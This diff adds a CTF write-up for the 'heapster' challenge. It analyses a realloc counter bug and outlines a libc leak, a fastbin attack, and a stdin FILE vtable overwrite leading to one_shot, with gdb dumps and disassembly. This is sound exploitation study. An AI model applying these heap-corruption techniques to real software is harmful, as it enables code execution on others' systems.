@@ -1,0 +1,327 @@
+tl;dr
+-----
+The ability to fill heap chunks stored in the `heapChunkArray[]` global at `0x555555757500` is predicated on the specified index being less than the `numChunks` global at `0x5555557570C4`.
+
+However, the `reallocMain()` function contains a vulnerability which allows us to continue incrementing `numChunks` even if we don't need to allocate a new chunk to service the `realloc()` request. 
+
+```
+if ( newPtr )
+{
+  if ( oldPtr == newPtr )
+  {
+	sizeArray[(signed int)getIdx((__int64)oldPtr)] = size;
+  }
+  else
+  {
+	updateGlobals((__int64)oldPtr);
+	memFrobMain();
+	heapChunkArray[numChunks] = newPtr;
+	sizeArray[numChunks] = size;
+	memFrobMain();
+  }
+  ++numChunks; <-- vuln is here! numChunks should only be incremented if oldPtr != newPtr
+}
+```
+
+THIS ALLOWS US TO FREE A CHUNK AND THEN FILL IT UP AFTER IT IS FREED.
+
+We can exploit this vulnerability to perform a fastbin attack and then overwrite the vptr of `_IO_2_1_stdin_` with the address of a heap chunk whose contents we control, so that eventually one_shot is called.
+
+gdb-peda$ x/40xg &_IO_2_1_stdin_
+0x7f5ebcc8c8e0 <_IO_2_1_stdin_>:        0x00000000fbad2088      0x000056331003d010
+0x7f5ebcc8c8f0 <_IO_2_1_stdin_+16>:     0x000056331003d010      0x000056331003d010
+0x7f5ebcc8c900 <_IO_2_1_stdin_+32>:     0x000056331003d010      0x000056331003d010
+0x7f5ebcc8c910 <_IO_2_1_stdin_+48>:     0x000056331003d010      0x000056331003d010
+0x7f5ebcc8c920 <_IO_2_1_stdin_+64>:     0x000056331003e010      0x0000000000000000
+0x7f5ebcc8c930 <_IO_2_1_stdin_+80>:     0x0000000000000000      0x0000000000000000
+0x7f5ebcc8c940 <_IO_2_1_stdin_+96>:     0x0000000000000000      0x0000000000000000
+0x7f5ebcc8c950 <_IO_2_1_stdin_+112>:    0x0000000000000000      0xffffffffffffffff
+0x7f5ebcc8c960 <_IO_2_1_stdin_+128>:    0x0000000000000000      0x00007f5ebcc8e790
+0x7f5ebcc8c970 <_IO_2_1_stdin_+144>:    0xffffffffffffffff      0x0000000000000000
+0x7f5ebcc8c980 <_IO_2_1_stdin_+160>:    0x00007f5ebcc8c9c0      0x0000000000000000
+0x7f5ebcc8c990 <_IO_2_1_stdin_+176>:    0x0000000000000000      0x0000000000000000
+0x7f5ebcc8c9a0 <_IO_2_1_stdin_+192>:    0x00000000ffffffff      0x0000000000000000
+0x7f5ebcc8c9b0 <_IO_2_1_stdin_+208>:    0x0000000000000000      0x00007f5ebcc8b6e0 <-- want to corrupt this!
+0x7f5ebcc8c9c0 <_IO_wide_data_0>:       0x0000000000000000      0x0000000000000000
+0x7f5ebcc8c9d0 <_IO_wide_data_0+16>:    0x0000000000000000      0x0000000000000000
+0x7f5ebcc8c9e0 <_IO_wide_data_0+32>:    0x0000000000000000      0x0000000000000000
+0x7f5ebcc8c9f0 <_IO_wide_data_0+48>:    0x0000000000000000      0x0000000000000000
+0x7f5ebcc8ca00 <_IO_wide_data_0+64>:    0x0000000000000000      0x0000000000000000
+0x7f5ebcc8ca10 <_IO_wide_data_0+80>:    0x0000000000000000      0x0000000000000000
+
+At first I tried to corrupt `_IO_2_1_stdout_`'s vptr, but the attack failed, because when `one_shot` was called, none of the conditions were met.
+
+Also, another issue I came across was I kept crashing if I overwrote parts of _IO_2_1_stdin_ with garbage data.
+
+I was able to get around this issue, though, by carefully crafting my payload to preserve all but the vptr of `_IO_2_1_stdin_`.
+-------
+ 
+
+
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+
+gdb-peda$ r
+Starting program: /home/vagrant/CTFs/codegatectf15/heapster/heapster
+
+[ 0] Malloc
+[ 1] Realloc
+[ 2] Free 
+[ 3] Fill 
+[ 4] Dump 
+[ 5] Print blocklist
+[ 6] Exit 
+
+
+array of pointers to REDADONLY strings in WRITEABLE section of elf:
+gdb-peda$ x/32xg 0x203040+0x0000555555554000
+0x555555757040: 0x0000555555555b3a      0x0000555555555b41
+0x555555757050: 0x0000555555555b49      0x0000555555555b4e
+0x555555757060: 0x0000555555555b53      0x0000555555555b58
+0x555555757070: 0x0000555555555b68      0x0000000000000000
+0x555555757080: 0x0000555555554f81      0x00005555555550be
+0x555555757090: 0x0000555555555349      0x0000555555555497
+0x5555557570a0: 0x0000555555555647      0x00005555555557d9
+0x5555557570b0: 0x000055555555584a      0x0000000000000000
+0x5555557570c0: 0x0000000000000000      0x0000000000000000
+0x5555557570d0: 0x0000000000000000      0x0000000000000000
+0x5555557570e0: 0x0000000000000000      0x0000000000000000
+0x5555557570f0: 0x0000000000000000      0x0000000000000000
+0x555555757100: 0x0000000000000000      0x0000000000000000
+0x555555757110: 0x0000000000000000      0x0000000000000000
+0x555555757120: 0x0000000000000000      0x0000000000000000
+0x555555757130: 0x0000000000000000      0x0000000000000000
+
+gdb-peda$ vmmap 0x0000555555555b3a
+Start              End                Perm      Name
+0x0000555555554000 0x0000555555556000 r-xp      /home/vagrant/CTFs/codegatectf15/heapster/heapster
+gdb-peda$ vmmap 0x555555757040
+Start              End                Perm      Name
+0x0000555555757000 0x0000555555758000 rw-p      /home/vagrant/CTFs/codegatectf15/heapster/heapster
+
+
+.data:0000000000203040 menuItems       dq offset aMalloc_0     ; DATA XREF: printMenu:loc_1873↑o
+.data:0000000000203040                                         ; printMenu:loc_189E↑o ...
+.data:0000000000203040                                         ; "Malloc"
+.data:0000000000203048                 dq offset aRealloc_0    ; "Realloc"
+.data:0000000000203050                 dq offset aFree_0       ; "Free"
+.data:0000000000203058                 dq offset aFill         ; "Fill"
+.data:0000000000203060                 dq offset aDump         ; "Dump"
+.data:0000000000203068                 dq offset aPrintBlocklist ; "Print blocklist"
+.data:0000000000203070                 dq offset aExit_0       ; "Exit"
+.data:0000000000203078                 align 20h
+.data:0000000000203080 fncPtrs         dq offset mallocMain    ; DATA XREF: getCmd:loc_198B↑o
+.data:0000000000203088                 dq offset reallocMain
+.data:0000000000203090                 dq offset freeMain
+.data:0000000000203098                 dq offset fillMain
+.data:00000000002030A0                 dq offset dumpMain
+.data:00000000002030A8                 dq offset printBlocklistMain
+.data:00000000002030B0                 dq offset exitMain
+
+
+pointers to chunks that are allocated are stored in a frobnicated heapChunkArray in the BSS:
+gdb-peda$ x/32xg 0x203500+0x0000555555554000
+0x555555757500: 0x2a2a7f7f7f5fbe1a      0x2a2a7f7f7f5fbada <-- heapChunkArray @ 0x555555757500
+0x555555757510: 0x2a2a7f7f7f5fb8ba      0x2a2a7f7f7f5fba0a
+0x555555757520: 0x2a2a7f7f7f5fb94a      0x2a2a7f7f7f5fbe1a
+0x555555757530: 0x0000000000000000      0x0000000000000000
+0x555555757540: 0x0000000000000000      0x0000000000000000
+0x555555757550: 0x0000000000000000      0x0000000000000000 <-- only frobnicates up to here
+0x555555757560: 0x0000000000000000      0x0000000000000000
+0x555555757570: 0x0000000000000000      0x0000000000000000
+0x555555757580: 0x00000000000000c8      0x00000000000000c8 <-- sizeArray @ 0x555555757580
+0x555555757590: 0x00000000000000c8      0x00000000000000c8
+0x5555557575a0: 0x00000000000000c8      0x00000000000000c8
+0x5555557575b0: 0x0000000000000000      0x0000000000000000
+
+
+post-defrobnication:
+gdb-peda$ x/20xg 0x555555757500
+0x555555757500: 0x0000555555759430      0x00005555557590f0
+0x555555757510: 0x0000555555759290      0x0000555555759020
+0x555555757520: 0x0000555555759360      0x0000555555759430
+0x555555757530: 0x2a2a2a2a2a2a2a2a      0x2a2a2a2a2a2a2a2a
+0x555555757540: 0x2a2a2a2a2a2a2a2a      0x2a2a2a2a2a2a2a2a
+0x555555757550: 0x0000000000000000      0x0000000000000000
+
+numChunks stored in global @ 0x5555557570c4
+MAX 9 CHUNKS!
+
+mallocMain
+----------
+- checks to see if numChunks <= 9
+- will take in any user input for size up to 1024 bytes
+- will malloc that size
+- will store pointer to heap chunk in heapChunkArray @ 
+	- pointer is frobnicated (each byte is xor'd with 0x2a)
+
+updateGlobals(pHeapChunk)
+-------------------------
+- checks to see if `pHeapChunk` exists in `heapChunkArray`. 
+	- if it does, set `heapChunkArray[i] = heapChunkArray[numChunks - 1]` 
+
+findChunk(pHeapChunk)
+---------------------
+returns corresponding size of pHeapChunk in sizeArray[] if found!
+
+
+VULNS
+=====
+can write extra data to stack:
+	cmd>> 0AAAAAAAAAAAAAAAA
+	
+	gdb-peda$ find "AAAA" all
+	Searching for 'AAAA' in: all ranges
+	Found 7 results, display max 7 items:
+    [heap] : 0x555555758014 ('A' <repeats 13 times>, "\n")
+    [heap] : 0x555555758018 ("AAAAAAAAA\n")
+    [heap] : 0x55555575801c --> 0xa4141414141 ('AAAAA\n')
+	[stack] : 0x7fffffffd9c1 ('A' <repeats 16 times>, "\n")
+	[stack] : 0x7fffffffd9c5 ('A' <repeats 12 times>, "\n")
+	[stack] : 0x7fffffffd9c9 ("AAAAAAAA\n")
+	[stack] : 0x7fffffffd9cd --> 0x3d000a41414141 ('AAAA\n')
+
+if you realloc a chunk repeatedly w/out malloc-ing a new one, you can continue increasing numChunks, allowing you to free a chunk and thenfill it!
+
+you can fill Free'd chunks!
+
+
+libc LEAK
+====
+A = malloc(200)
+B = malloc(200)
+C = malloc(200)
+
+free(B)
+free(A)
+
+D = malloc(200) <-- allocated in old A location
+dump D
+
+
+gdb-peda$ call $memFrobMain()
+$6 = 0x55757500
+
+after all mallocs()
+-------------------
+gdb-peda$ x/20xg 0x203500+0x0000555555554000
+0x555555757500: 0x0000555555759020      0x00005555557590f0
+0x555555757510: 0x00005555557591c0      0x0000555555759290
+0x555555757520: 0x0000555555759360      0x0000555555759430
+0x555555757530: 0x2a2a2a2a2a2a2a2a      0x2a2a2a2a2a2a2a2a
+0x555555757540: 0x2a2a2a2a2a2a2a2a      0x2a2a2a2a2a2a2a2a
+
+
+after free(0x0000555555759020)
+------------------------------
+gdb-peda$ x/20xg $heapChunkArray
+0x555555757500: 0x0000555555759430      0x00005555557590f0
+0x555555757510: 0x00005555557591c0      0x0000555555759290
+0x555555757520: 0x0000555555759360      0x0000555555759430
+0x555555757530: 0x2a2a2a2a2a2a2a2a      0x2a2a2a2a2a2a2a2a
+0x555555757540: 0x2a2a2a2a2a2a2a2a      0x2a2a2a2a2a2a2a2a
+
+after free(0x5555557591c0)
+gdb-peda$ x/20xg $heapChunkArray
+0x555555757500: 0x0000555555759430      0x00005555557590f0
+0x555555757510: 0x0000555555759360      0x0000555555759290
+0x555555757520: 0x0000555555759360      0x0000555555759430
+0x555555757530: 0x2a2a2a2a2a2a2a2a      0x2a2a2a2a2a2a2a2a
+0x555555757540: 0x2a2a2a2a2a2a2a2a      0x2a2a2a2a2a2a2a2a
+
+
+write a python script to port symbols (including custom added names) to gdb text file that you can load by using `source` cmd: 
+format for text file: `set $<symbol name> = <addr>`
+
+
+
+gdb-peda$ x/32xg 0x555555759020
+0x555555759020: 0x00007ffff7b68bff      0x00005555557591b0
+0x555555759030: 0x0000000000000000      0x0000000000000000
+0x555555759040: 0x0000000000000000      0x0000000000000000
+0x555555759050: 0x0000000000000000      0x0000000000000000
+0x555555759060: 0x0000000000000000      0x0000000000000000
+0x555555759070: 0x0000000000000000      0x0000000000000000
+0x555555759080: 0x0000000000000000      0x0000000000000000
+0x555555759090: 0x0000000000000000      0x0000000000000000
+0x5555557590a0: 0x0000000000000000      0x0000000000000000
+0x5555557590b0: 0x0000000000000000      0x0000000000000000
+0x5555557590c0: 0x0000000000000000      0x0000000000000000
+0x5555557590d0: 0x0000000000000000      0x0000000000000000
+0x5555557590e0: 0x00000000000000d0      0x00000000000000d1
+0x5555557590f0: 0x0000000000000000      0x0000000000000000
+
+
+
+libc base @ 0x00007ffff77a4000
+0x7ffff7b69700 <stderr>:        0x00007ffff7b69540      0x00007ffff7b69620
+0x7ffff7b69710 <stdin>: 0x00007ffff7b688e0      0x00007ffff77c4b70
+
+
+normal:
+gdb-peda$ x/40xg &_IO_2_1_stdout_
+0x7ffff7b69620 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007ffff7b696a3
+0x7ffff7b69630 <_IO_2_1_stdout_+16>:    0x00007ffff7b696a3      0x00007ffff7b696a3
+0x7ffff7b69640 <_IO_2_1_stdout_+32>:    0x00007ffff7b696a3      0x00007ffff7b696a3
+0x7ffff7b69650 <_IO_2_1_stdout_+48>:    0x00007ffff7b696a3      0x00007ffff7b696a3
+0x7ffff7b69660 <_IO_2_1_stdout_+64>:    0x00007ffff7b696a4      0x0000000000000000
+0x7ffff7b69670 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
+0x7ffff7b69680 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffff7b688e0
+0x7ffff7b69690 <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff
+0x7ffff7b696a0 <_IO_2_1_stdout_+128>:   0x000000000a000000      0x00007ffff7b6a780
+0x7ffff7b696b0 <_IO_2_1_stdout_+144>:   0xffffffffffffffff      0x0000000000000000
+0x7ffff7b696c0 <_IO_2_1_stdout_+160>:   0x00007ffff7b687a0      0x0000000000000000
+0x7ffff7b696d0 <_IO_2_1_stdout_+176>:   0x0000000000000000      0x0000000000000000
+0x7ffff7b696e0 <_IO_2_1_stdout_+192>:   0x00000000ffffffff      0x0000000000000000
+0x7ffff7b696f0 <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007ffff7b676e0
+0x7ffff7b69700 <stderr>:        0x00007ffff7b69540      0x00007ffff7b69620
+0x7ffff7b69710 <stdin>: 0x00007ffff7b688e0      0x00007ffff77c4b70
+0x7ffff7b69720 <map>:   0x0000000000000000      0x0000000000000000
+0x7ffff7b69730 <__printf_arginfo_table>:        0x0000000000000000      0x0000000000000000
+0x7ffff7b69740 <buf>:   0x0000000000000000      0x0000000000000000
+0x7ffff7b69750 <buffer>:        0x0000000000000000      0x0000000000000000
+
+corrupt:
+gdb-peda$ x/40xg &_IO_2_1_stdout_
+0x7ffff7b69620 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007ffff7b696a3
+0x7ffff7b69630 <_IO_2_1_stdout_+16>:    0x00007ffff7b696a3      0x00007ffff7b696a3
+0x7ffff7b69640 <_IO_2_1_stdout_+32>:    0x00007ffff7b696a3      0x00007ffff7b696a3
+0x7ffff7b69650 <_IO_2_1_stdout_+48>:    0x00007ffff7b696a3      0x00007ffff7b696a3
+0x7ffff7b69660 <_IO_2_1_stdout_+64>:    0x00007ffff7b696a4      0x0000000000000000
+0x7ffff7b69670 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
+0x7ffff7b69680 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffff7b688e0
+0x7ffff7b69690 <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff
+0x7ffff7b696a0 <_IO_2_1_stdout_+128>:   0x000000000a000000      0x00007ffff7b6a780
+0x7ffff7b696b0 <_IO_2_1_stdout_+144>:   0xffffffffffffffff      0x0000000000000000
+0x7ffff7b696c0 <_IO_2_1_stdout_+160>:   0x00007ffff7b687a0      0xffffff0000000000
+0x7ffff7b696d0 <_IO_2_1_stdout_+176>:   0xffffffffffffffff      0xffffffffffffffff
+0x7ffff7b696e0 <_IO_2_1_stdout_+192>:   0xffffffffffffffff      0xffffffffffffffff
+0x7ffff7b696f0 <_IO_2_1_stdout_+208>:   0xffffffffffffffff      0x4141414141414141
+0x7ffff7b69700 <stderr>:        0xffffffffffffffff      0xffffffffffffffff
+0x7ffff7b69710 <stdin>: 0x00007ffff7b688e0      0x00007ffff77c4b70
+0x7ffff7b69720 <map>:   0x0000000000000000      0x0000000000000000
+0x7ffff7b69730 <__printf_arginfo_table>:        0x0000000000000000      0x0000000000000000
+0x7ffff7b69740 <buf>:   0x0000000000000000      0x0000000000000000
+0x7ffff7b69750 <buffer>:        0x0000000000000000      0x0000000000000000
+
+
+0x7ffff7b688e0 <_IO_2_1_stdin_>:        0x00000000fbad2088      0x0000555555758010
+0x7ffff7b688f0 <_IO_2_1_stdin_+16>:     0x0000555555758010      0x0000555555758010
+0x7ffff7b68900 <_IO_2_1_stdin_+32>:     0x0000555555758010      0x0000555555758010
+0x7ffff7b68910 <_IO_2_1_stdin_+48>:     0x0000555555758010      0x0000555555758010
+0x7ffff7b68920 <_IO_2_1_stdin_+64>:     0x0000555555759010      0x0000000000000000
+0x7ffff7b68930 <_IO_2_1_stdin_+80>:     0x0000000000000000      0x0000000000000000
+0x7ffff7b68940 <_IO_2_1_stdin_+96>:     0x0000000000000000      0x0000000000000000
+0x7ffff7b68950 <_IO_2_1_stdin_+112>:    0x0000000000000000      0xffffffffffffffff
+0x7ffff7b68960 <_IO_2_1_stdin_+128>:    0x0000000000000000      0x00007ffff7b6a790
+0x7ffff7b68970 <_IO_2_1_stdin_+144>:    0xffffffffffffffff      0x0000000000000000
+0x7ffff7b68980 <_IO_2_1_stdin_+160>:    0x00007ffff7b689c0      0x0000000000000000
+0x7ffff7b68990 <_IO_2_1_stdin_+176>:    0x0000000000000000      0x0000000000000000
+0x7ffff7b689a0 <_IO_2_1_stdin_+192>:    0x00000000ffffffff      0x0000000000000000
+0x7ffff7b689b0 <_IO_2_1_stdin_+208>:    0x0000000000000000      0x00007ffff7b676e0
+0x7ffff7b689c0 <_IO_wide_data_0>:       0x0000000000000000      0x0000000000000000
+0x7ffff7b689d0 <_IO_wide_data_0+16>:    0x0000000000000000      0x0000000000000000
